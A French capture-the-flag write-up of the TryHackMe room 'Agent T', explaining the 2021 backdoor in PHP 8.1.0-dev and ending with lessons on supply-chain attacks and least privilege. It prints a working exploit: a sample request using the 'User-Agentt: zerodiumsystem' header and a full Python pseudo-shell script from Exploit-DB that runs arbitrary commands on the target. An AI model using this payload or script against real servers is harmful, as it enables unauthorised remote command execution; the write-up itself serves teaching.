---
title: "CTF - Agent T"
date: 2026-03-02
categories: [tryhackme]
tags: [webexploitation,php,exploit,payload,RCE,backdoor]
image: /assets/img/writeups/agentT/logo.png
---

### Introduction  
La room [Agent T](https://tryhackme.com/room/agentt) proposée sur TryHackMe met en avant un cas concret de faille historique dans PHP.  
L'objectif est de comprendre comment une backdoor volontairement injectée dans le code source d'un langage peut mener à une compromission totale d'une machine, sans nécessiter la moindre étape d'élévation de privilèges.


### Phase d'énumération 
Scan Nmap :
```shell
$ nmap -p- -sC -sV -Pn 10.82.190.83

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 15:08 +0200
Nmap scan report for 10.82.190.83
Host is up (0.069s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.33 seconds
```
`-p-` : scanne l’ensemble des 65535 ports    
`-sC` : exécute les scripts par défaut      
`-sV` : détecte les versions des services      
`-Pn` : ignore le ping initial (utile si l’hôte bloque les ICMP)      

<u>Il y a un port ouvert :</u>      

- **80 (HTTP)**  
Un serveur web PHP est accessible. Il mérite une analyse approfondie afin d’identifier d’éventuelles vulnérabilités ou informations sensibles. 
Un des détails qui a attirer mon attention était sa version, il y aurait-il potentiellement une vulnérabilité pour la version PHP 8.1.0-dev ?  

Bingo, il y en avait bien une !

###  Web Exploitation 
Le scan Nmap révèle un serveur de développement PHP en version **8.1.0-dev**.  
Cette version est connue pour une **backdoor injectée directement dans le code source du langage.**

**Petit rappel : `User-Agent` ?**  
<u>Définition header User-Agent :</u>  
> Quand un navigateur (ou un outil comme `curl`, Burp Suite, ou un script Python) envoie une requête HTTP,   
> il joint automatiquement plusieurs "en-têtes" (headers) donnant des informations sur la requête.  
>  
> Le `User-Agent` en fait partie : **il indique au serveur quel logiciel effectue la requête** (navigateur, version, OS...).
> Ce header est **entièrement contrôlé par le client** : rien n'empêche de le modifier, voire d'en ajouter un nouveau, inventé de toutes pièces. C'est justement ce point qui va être détourné ici.

💁‍♂️ **Anecdote : comment est arrivée cette vulnérabilité ?**
> Le 28 mars 2021, le dépôt Git officiel de PHP (`git.php.net`) a été compromis. Deux commits malveillants ont été poussés sur le dépôt `php-src`, en usurpant l'identité de deux développeurs légitimes du projet : Rasmus Lerdorf (créateur de PHP) et Nikita Popov (mainteneur).
> Ces commits étaient déguisés en simples corrections de typo (`"Fix typo"`), mais ajoutaient en réalité un appel à la fonction interne `zend_eval_string()`, qui permet d'évaluer et d'exécuter dynamiquement du code PHP à partir d'une simple chaîne de caractères.


Le code ajouté vérifiait la présence d'un header HTTP nommé **`User-Agentt`** (avec deux "t", volontairement différent du header standard `User-Agent` pour ne pas entrer en conflit avec lui). Si la valeur de cet en-tête commençait par la chaîne `zerodiumsystem`, <span style="color:#f03a3a;">tout ce qui se trouvait entre les parenthèses était directement transmis à `zend_eval_string()` et exécuté côté serveur</span>, comme une commande système classique.

Autrement dit : "*une simple requête HTTP suffit à faire exécuter n'importe quelle commande au serveur*".   
C'est ce qu'on appelle une **backdoor** (porte dérobée) : 
> un accès caché, volontairement inséré dans le code, permettant de contourner toutes les protections habituelles.

Concrètement, une requête comme celle-ci suffit à exécuter une commande système :
```http
GET / HTTP/1.1
Host: cible
User-Agentt: zerodiumsystem('id');
```
Le backdoor a été repéré et retiré quelques heures après sa découverte, avant même la sortie officielle de PHP 8.1.

###  Remote Code Execution
Maintenant que la vulnérabilité est comprise, j'ai cherché un payload existant permettant d'obtenir un shell interactif. J'ai fini par en trouver un sur [Exploit-DB](https://www.exploit-db.com/exploits/49933).
![Aperçu du site](/assets/img/writeups/agentT/exploit.png)  


Utilisation d'un playload fournie par exploit-db: 
```python

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
            
```
<u>Explication du script :</u>
- `host = input(...)` : demande l'URL complète de la cible (ex : `http://10.82.190.83`).
- `request.get(host)` : envoie une première requête classique, juste pour vérifier que le serveur répond bien (`200 OK`). Si ce n'est pas le cas, le script s'arrête (`else`) et affiche que l'hôte est injoignable.
- Une fois la connexion confirmée, le script entre dans une boucle infinie (`while 1`) qui simule un shell :
  - `cmd = input("$ ")` : demande à l'utilisateur quelle commande il souhaite exécuter sur la machine cible (ex : `id`, `whoami`, `find / -name flag.txt`).
  - Le header malveillant est alors construit dynamiquement : `"User-Agentt": "zerodiumsystem('" + cmd + "');"`. Si on tape `id`, le header envoyé devient `zerodiumsystem('id');`, exactement comme vu dans la partie théorique.
  - `request.get(host, headers = headers, ...)` : la requête est envoyée avec ce header piégé. Le serveur PHP, vulnérable, l'exécute côté serveur.
  - Le serveur renvoie normalement sa page HTML habituelle, mais avec le résultat de la commande affiché juste avant. Le script isole ce résultat en coupant la réponse à l'endroit où commence le HTML (`current_page.split('<!DOCTYPE html>', 1)`), et n'affiche que la partie qui nous intéresse : la sortie de la commande.
- `except KeyboardInterrupt` : permet de quitter proprement le pseudo-shell avec `Ctrl+C`.

![Aperçu du site](/assets/img/writeups/agentT/shell.png)   
On obtient ainsi un shell interactif basique nous permettant d'exécuter n'importe quelle commande avec les mêmes privilèges que le processus PHP, qui tourne ici en **root**.

```shell
$ find / -name flag.txt 2> /dev/null
/flag.txt

$ cat /flag.txt
flag{41xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```
- <span style="color:#00ff99;">FLAG : flag{41xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}</span>

### Conclusion

Ce challenge met en évidence :

1. La dangerosité des **attaques sur la chaîne d'approvisionnement (*supply chain attacks*)**
- Ici, ce n'est pas une faille applicative classique qui est en cause, mais une compromission directe du dépôt source du langage lui-même. Cela rappelle qu'une vulnérabilité peut être introduite bien en amont, avant même que le code n'arrive sur un serveur de production.

2. L'absence de séparation des privilèges  
- Le serveur PHP tournait directement en tant que **root**, ce qui a transformé une simple RCE en compromission totale et immédiate de la machine, sans aucune étape d'élévation de privilèges nécessaire.  
- **Appliquer le principe de moindre privilège aurait limité l'impact de cette faille**, même en cas d'exploitation réussie.    

3. L'importance de la méthodologie  
- Une simple identification de version via Nmap, couplée à une recherche rapide sur les vulnérabilités publiques connues, a suffi à obtenir un accès complet au système. Ca démontre qu'**il est très important de toujours vérifier les versions de services exposés.**